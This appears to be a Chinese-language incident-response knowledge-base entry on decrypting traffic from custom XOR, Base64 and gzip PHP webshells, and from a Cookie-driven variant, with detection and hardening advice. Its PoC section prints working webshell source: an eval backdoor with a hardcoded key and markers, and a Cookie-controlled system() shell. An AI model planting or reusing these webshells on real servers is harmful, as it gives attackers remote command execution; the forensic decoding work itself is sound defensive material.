---
id: defense-forensics-custom-xor-gzip-php-webshell-traffic
title: 自定义 XOR+Base64+gzip PHP Webshell 流量解密：请求/响应标记与 Cookie 回显
type: scenario
domain: defense
path: defense/forensics
technique: custom-php-webshell-traffic-decrypt
aliases:
- PHP webshell 流量解密
- 异或加密马
- base64+gzcompress webshell
- Cookie 回显 webshell
- 加密马请求响应还原
tags:
- forensics
- php
- webshell
- traffic
- xor
- base64
- gzip
- incident-response
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V214
  verified_at: '2026-11-07T04:21:05+08:00'
  notes: 已对照原文与51张截图核对：去混淆马 =e10adc39/=49ba59abbe56/=e057f20f883e/ 与 Cookie 回显变体（cm/cn/cp）均与原文一致；与哥斯拉/冰蝎卡为不同加密结构，dup-scan related 不合并。未在本机执行解码脚本。
---

## 一句话结论

自定义 PHP 加密马常把命令/回显做 `Base64 → 循环 XOR → gzip/gzcompress` 后夹在固定标记（如 `$kh...$kf`）中，或在 Cookie 中传命令、用 `Set-Cookie` 回显；从流量里提取标记间内容，按马内 `$k`/`$kh`/`$kf`/`$p` 和分隔符还原，就能完整解出攻击者执行的命令与输出。

## 原理

- 典型加密马的执行逻辑（文章样本去混淆后）：
  - `preg_match("/$kh(.+)$kf/", file_get_contents("php://input"), $m)` 从 POST body 提取标记 `$kh` 与 `$kf` 之间的密文；
  - `@eval(@gzuncompress(@x(@base64_decode($m[1]), $k)))`：Base64 解码 → 与 `$k` 循环 XOR → `gzuncompress` 解压 → `eval` 执行；
  - 回显：`$o=ob_get_contents(); $r=base64_encode(gzcompress(x($o,$k))); print("$p$kh$r$kf")`。
- XOR 是对称的：`x($t,$k)` 用 `$k` 循环异或，加密和解密同一个函数；密钥/标记/前缀都硬编码在馬文件中，拿到样本即可解密全部流量。
- 另一种常见变体是 Cookie 驱动：
  - 请求 Cookie `cm=<base64(cmd)>`，马执行 `system(base64_decode($_COOKIE['cm']))`；
  - 响应 `Set-Cookie: <cn>=<cp><base64(输出)><cp>`，`cp` 是分隔符，`cn` 是 Cookie 名；按 `cp` 切分取中间段 Base64 解码即可还原命令输出。
- 流量侧的关键是识别标记/分隔符：`$kh`/`$kf`/`$p` 是固定字符串，Cookie 回显则看 `Set-Cookie` 中重复出现的非 Base64 分隔符；多条请求/响应按时间排序拼接，可还原攻击者的完整操作序列。

## 触发条件

- 已获取 webshell 样本或能从流量中的请求/响应推断编码方式（标记、密钥、Base64/XOR/gzip 顺序）。
- PCAP 中包含完整的 HTTP 请求与响应体；POST body、Cookie、Set-Cookie 未被截断。
- 加密马的密钥/标记硬编码在样本中，或可从样本中静态提取。
- 流量未使用 TLS，或已通过证书/会话密钥解密。

## 利用步骤

1. 在流量中定位 webshell 请求：常见路径如 `/indexa.php`、`/upload/.../a.php`；查看 POST body 是否含固定前后缀。
2. 从样本中提取 `$k`、`$kh`、`$kf`、`$p`（或 Cookie 名 `cn`、分隔符 `cp`）。
3. 用正则提取 `$kh(.+?)$kf` 之间的密文，按 `Base64 解码 → 循环 XOR($k) → gzip/zlib 解压` 还原命令；响应方向同样处理。
4. Cookie 变体：从请求 Cookie 取 `cm` 做 Base64 解码得到命令；从响应 `Set-Cookie` 中按 `cp` 切分，取中间 Base64 段解码得到输出。
5. 按时间顺序拼接所有命令与输出，还原攻击者行为（目录、用户、文件、横向等）。
6. 如果 Base64 带 URL 编码，先 `urllib.parse.unquote` 再解码；gzip 解压失败时尝试 zlib/raw deflate。

## PoC

去混淆后的马核心（文章样本）：

```php
$k = "e10adc39";
$kh = "49ba59abbe56";
$kf = "e057f20f883e";
$p = "vkzJl2VQbzhPhLHS";
function x($t, $k) {
    $c = strlen($k); $l = strlen($t); $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
    $o = @ob_get_contents(); @ob_end_clean();
    $r = @base64_encode(@gzcompress(@x($o, $k)));
    print("$p$kh$r$kf");
}
```

Python 解码核心：

```python
import base64, gzip, zlib, re

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def decode(payload_b64: str, key: bytes):
    raw = base64.b64decode(payload_b64 + "=" * (-len(payload_b64) % 4))
    dec = xor(raw, key)
    for fn in (gzip.decompress, zlib.decompress):
        try:
            return fn(dec).decode("utf-8", "ignore")
        except Exception:
            pass
    return dec.decode("utf-8", "ignore")

kh, kf, key = "49ba59abbe56", "e057f20f883e", b"e10adc39"
# m = re.search(re.escape(kh) + r"(.*?)" + re.escape(kf), http_body, re.S)
# print(decode(m.group(1), key))
```

Cookie 变体（文章 a.php）：

```php
if (isset($_COOKIE['cm'])) {
    ob_start();
    system(base64_decode($_COOKIE['cm']) . ' 2>&1');
    setcookie($_COOKIE['cn'], $_COOKIE['cp'] . base64_encode(ob_get_contents()) . $_COOKIE['cp']);
    ob_end_clean();
}
```

## 变体与关联

- 变体：Godzilla/冰蝎等成熟马有固定结构；见 [[defense-forensics-godzilla-php-webshell-traffic-decode]]、[[defense-forensics-behinder-php-webshell-traffic-decrypt]]。
- 变体：请求/响应标记可以是任意随机字符串，密钥可以是 MD5/自定义字母表；先静态提取再解密。
- 变体：Cookie 回显的分隔符 `cp` 可能每次不同，按 `Set-Cookie` 中重复出现的非 Base64 字符自动识别。
- 关联：[[defense-forensics-behinder-php-rc4-xor-modified-traffic]]（RC4/XOR 变体）。
- 边界：流量被 TLS 加密且无私钥/会话密钥、POST body 被截断、马使用一次性密钥或非对称加密时，无法仅靠流量还原。

## 检测与防御

- 检测：HTTP POST body 中出现固定前后缀夹着 Base64 长串；`Set-Cookie` 中出现重复分隔符包裹的 Base64；同一 PHP 文件频繁接收短 POST 并返回短响应。
- 防御：WAF/EDR 对 webshell 上传与异常 POST 行为告警；文件完整性监控；禁用不必要的文件写入权限；对出站流量做异常检测。
- 加固：Web 目录只读、上传目录不可执行；PHP `disable_functions` 限制 `system`/`eval`；定期排查 Webshell 与异常 Cookie 流量。
